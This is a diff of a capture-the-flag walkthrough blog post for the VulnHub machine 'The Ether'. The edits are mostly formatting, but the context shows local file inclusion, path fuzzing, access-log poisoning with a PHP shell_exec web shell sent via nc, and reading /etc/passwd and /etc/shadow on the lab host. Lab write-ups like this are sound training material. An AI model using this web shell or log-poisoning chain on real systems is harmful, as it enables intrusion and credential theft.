@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "This isn't Bad Science. It's Evil Science"
+title: "This Isn't Bad Science. It's Evil Science"
 comments: true
 category: walkthrough
 tags: [vulnhub, "The Ether"]
@@ -20,7 +20,9 @@ A mysterious company, _The Ether_ has proclaimed an elixir that considerably alt
 Let's kick this off with a `nmap` scan to establish the services available in **theEther**.
 
 ```
-# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130`
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.198.130
+```
+```
 ...
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
@@ -42,6 +44,8 @@ Let's use `curl` and some `grep`-fu to see if there are any hyperlinks that I ca
 
 ```
 # curl -s 192.168.198.130 | grep -Eo '(src\=\".*\"|href\=\".*\")' | cut -d'"' -f2
+```
+```
 http://www.os-templates.com/
 layout/styles/layout.css
 index.php
@@ -87,7 +91,7 @@ Navigating to `/?file=about.php`, I noticed that the content of `/about.php` was
 
 OK. Now I'm positive there is a LFI vulnerability with the `file` parameter.
 
-### Mapping out DocumentRoot
+### Mapping of DocumentRoot
 
 I've tried the following common LFI attacks with no success:
 
@@ -144,6 +148,8 @@ Now, let's give `fuzz.sh` a shot.
 
 ```
 # ./fuzz.sh "../FUZZ/about.php" "About The Ether" /usr/share/seclists/Discovery/Web_Content/common.txt
+```
+```
 ...
 [+] Trying ../pub/about.php
 [+] Trying ../public/about.php
@@ -182,6 +188,8 @@ Using the custom wordlist with `fuzz.sh`, I was able to map out the next level.
 
 ```
 # ./brute.sh "../../FUZZ/public_html/about.php" "About The Ether" custom.txt 
+```
+```
 ...
 [+] Trying ../../theeTHER.CoM/public_html/about.php
 [+] Trying ../../theeTHER.COm/public_html/about.php
@@ -205,6 +213,8 @@ Using `quickhits.txt` from SecLists with `fuzz.sh`, I was able to map out this l
 
 ```
 # ./fuzz.sh "/var/www/html/theEther.comFUZZ" "^[0-9]" /usr/share/seclists/Discovery/Web_Content/quickhits.txt
+```
+```
 ...
 [+] Trying /var/www/html/theEther.com/log.sqlite
 [+] Trying /var/www/html/theEther.com/log.txt
@@ -220,6 +230,8 @@ Now that I've found `access.log`, I can corrupt it by sending PHP code through `
 
 ```
 # nc 192.168.198.130 80
+```
+```
 <pre><?php echo shell_exec($_GET['cmd']);?></pre>
 HTTP/1.1 400 Bad Request
 Date: Thu, 08 Feb 2018 20:22:21 GMT
@@ -278,6 +290,8 @@ Let's give it a shot.
 
 ```
 # ./cmd.sh -e "cat /etc/passwd"
+```
+```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -391,7 +405,7 @@ Armed with this new knowledge that `cat` was used, let's see if we can display `
 
 ![shadow](/assets/images/posts/evilscience-walkthrough/evilscience-16.png)
 
-Holy smoke! It worked.
+Holy smoke. It worked!
 
 My guess is that the command ran like so.
 
@@ -428,7 +442,6 @@ Finally, the cat is out of the bag!
 ```
 # strings flag.png | sed '$!d' | sed 's/flag: //' | base64 -d
 ```
-
 <pre class="wrap">
 october 1, 2017.
 We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!
